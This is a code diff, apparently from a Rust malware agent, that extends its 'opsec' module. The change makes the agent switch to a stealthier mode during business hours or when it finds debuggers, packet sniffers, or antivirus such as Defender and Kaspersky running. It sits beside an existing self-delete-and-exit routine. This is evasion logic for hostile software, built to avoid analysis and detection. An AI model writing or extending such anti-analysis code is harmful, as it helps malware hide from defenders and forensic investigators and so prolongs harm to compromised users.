@@ -1,8 +1,9 @@
-use log::{debug, warn};
+use log::{debug};
 use std::process;
-use std::time::Instant;
 use once_cell::sync::Lazy;
 use std::sync::Mutex;
+use chrono::Timelike;
+use sysinfo::{System};
 
 // Opsec mode per default on High risk to ensure maximum security.
 // This module is responsible for detecting the current opsec level based on user activity and system state.
@@ -67,11 +68,23 @@ pub fn detect_opsec_level() -> OpsecLevel {
 }
 
 pub fn determine_agent_mode() -> AgentMode {
-    let level = detect_opsec_level();
-    debug!("[OPSEC] determine_agent_mode() called, detected level: {:?}", level);
-    match detect_opsec_level() {
-        OpsecLevel::High => AgentMode::FullOpsec,
-        OpsecLevel::Low => AgentMode::BackgroundOpsec,
+    let mut context = OpsecContext::default();
+    context.during_business_hours = is_business_hours();
+    context.suspicious_process = has_suspicious_process();
+    context.suspicious_window = has_suspicious_window();
+    context.suspicious_network = is_suspicious_network();
+
+    let idle_level = detect_opsec_level();
+    debug!("[OPSEC] Context: {:?}, idle_level: {:?}", context, idle_level);
+
+    // Scoring: if any context signal is true, stay in FullOpsec
+    let score = context.score();
+    debug!("[OPSEC] Context score: {}", score);
+
+    if score >= 2 || idle_level == OpsecLevel::High {
+        AgentMode::FullOpsec
+    } else {
+        AgentMode::BackgroundOpsec
     }
 }
 
@@ -279,4 +292,52 @@ pub fn self_delete_and_exit() -> ! {
         let _ = fs::remove_file(&path);
     }
     process::exit(0);
+}
+
+#[derive(Default, Debug)]
+struct OpsecContext {
+    during_business_hours: bool,
+    suspicious_process: bool,
+    suspicious_window: bool,
+    suspicious_network: bool,
+}
+
+impl OpsecContext {
+    fn score(&self) -> u8 {
+        let mut score = 0;
+        if self.during_business_hours { score += 2; }
+        if self.suspicious_process { score += 2; }
+        if self.suspicious_window { score += 2; }
+        if self.suspicious_network { score += 2; }
+        score
+    }
+}
+
+fn is_business_hours() -> bool {
+    let now = chrono::Local::now();
+    let hour = now.hour();
+    // 8am to 6pm considered business hours
+    hour >= 8 && hour < 18
+}
+
+fn has_suspicious_process() -> bool {
+    let suspicious = ["wireshark", "tcpdump", "procmon", "procexp", "ida", "x64dbg", "ollydbg", "avast", "kaspersky", "defender"];
+    let sys = System::new_all();
+    for (_pid, process) in sys.processes() {
+        let name = process.name().to_string_lossy().to_lowercase();
+        if suspicious.iter().any(|s| name.contains(s)) {
+            return true;
+        }
+    }
+    false
+}
+
+// Placeholder: returns false, implement with platform-specific code for real use
+fn has_suspicious_window() -> bool {
+    false
+}
+
+// Placeholder: returns false, implement with platform-specific code for real use
+fn is_suspicious_network() -> bool {
+    false
 }
